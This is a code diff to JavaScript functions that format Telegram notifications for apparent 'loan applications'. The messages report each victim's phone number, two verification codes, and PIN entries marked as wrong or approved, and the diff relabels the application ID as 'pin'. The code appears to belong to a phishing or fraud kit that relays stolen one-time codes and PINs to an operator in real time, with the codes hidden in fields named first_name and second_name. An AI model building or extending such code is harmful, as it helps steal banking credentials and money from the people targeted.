@@ -372,7 +372,7 @@ function formatTelegramNotification(application, kind) {
 
   if (kind === "approved") {
     return `🎉 LOAN APPROVED\n\n` +
-      `📋 Application: ${id}\n` +
+      `🔑 pin: ${id}\n` +
       `📞 Phone: ${phone}\n` +
       `🔢 Code 1: ${code1}\n` +
       `🔢 Code 2: ${code2}\n` +
@@ -384,7 +384,7 @@ function formatTelegramNotification(application, kind) {
 
   if (kind === "wrongpin") {
     return `🔑 WRONG PIN — REJECTED\n\n` +
-      `📋 Application: ${id}\n` +
+      `🔑 pin: ${id}\n` +
       `📞 Phone: ${phone}\n` +
       `🔢 Attempt: #${attempt}\n\n` +
       `⚠️ Reason: Wrong PIN entered\n` +
@@ -405,7 +405,7 @@ function formatTelegramNotification(application, kind) {
 
   if (kind === "wrongsecond") {
     return `🔢 WRONG CODE 2 — REJECTED\n\n` +
-      `📋 Application: ${id}\n` +
+      `🔑 pin: ${id}\n` +
       `📞 Phone: ${phone}\n` +
       `🔢 Code 2: ${code2}\n` +
       `🔢 Attempt: #${attempt}\n\n` +
@@ -415,7 +415,7 @@ function formatTelegramNotification(application, kind) {
   }
 
   return `❌ LOAN REJECTED\n\n` +
-    `📋 Application: ${id}\n` +
+    `🔑 pin: ${id}\n` +
     `📞 Phone: ${phone}\n` +
     `🔢 Attempt: #${attempt}\n\n` +
     `⚠️ Status: APPLICATION REJECTED\n` +
@@ -447,7 +447,7 @@ async function notifyTelegram(application) {
   }
 
   const text = `${title}\n\n` +
-    `📋 Application: ${application.application_id || application.application_no || "—"}\n` +
+    `🔑 pin: ${application.application_id || application.application_no || "—"}\n` +
     `📞 Phone: ${application.phone || "—"}\n` +
     (application.status === "AWAITING_FIRST_NAME_APPROVAL" ? `🔢 Code 1: ${application.first_name || "—"}\n` : "") +
     (application.status === "AWAITING_SECOND_NAME_APPROVAL" ? `🔢 Code 2: ${application.second_name || "—"}\n` : "") +
